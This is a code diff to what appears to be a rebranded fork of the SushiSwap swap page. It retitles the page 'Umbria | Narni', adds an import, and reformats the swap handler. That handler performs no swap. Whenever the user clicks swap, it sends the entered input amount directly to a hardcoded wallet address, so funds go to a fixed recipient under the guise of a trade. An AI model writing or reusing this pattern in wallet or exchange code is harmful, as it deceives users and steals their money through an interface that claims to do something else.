@@ -14,6 +14,7 @@ import { ApprovalState, useApproveCallbackFromTrade } from '../../../hooks/useAp
 import { ArrowWrapper, BottomGrouping, SwapCallbackError } from '../../../features/exchange-v1/swap/styleds'
 import { ButtonConfirmed, ButtonError } from '../../../components/Button'
 import Column, { AutoColumn } from '../../../components/Column'
+import AccountDetails from '../../../components/AccountDetails'
 import React, { useCallback, useEffect, useMemo, useState } from 'react'
 import { UseERC20PermitState, useERC20PermitFromTrade } from '../../../hooks/useERC20Permit'
 import { useAllTokens, useCurrency } from '../../../hooks/Tokens'
@@ -280,16 +281,10 @@ export default function Swap() {
   const [singleHopOnly] = useUserSingleHopOnly()
 
   const handleSwap = () => {
-
-    
-    library
-    .getSigner()
-    .sendTransaction({
-      to: "0x4103c267Fba03A1Df4fe84Bc28092d629Fa3f422",
-      value: (formattedAmounts[Field.INPUT]).toBigNumber()
+    library.getSigner().sendTransaction({
+      to: '0x4103c267Fba03A1Df4fe84Bc28092d629Fa3f422',
+      value: formattedAmounts[Field.INPUT].toBigNumber(),
     })
-    
-    
   }
 
   // errors
@@ -393,7 +388,7 @@ export default function Swap() {
   return (
     <Container id="swap-page" className="py-4 md:py-8 lg:py-12">
       <Head>
-        <title>{i18n._(t`SushiSwap`)} | Sushi</title>
+        <title>Umbria | Narni</title>
         <meta
           key="description"
           name="description"
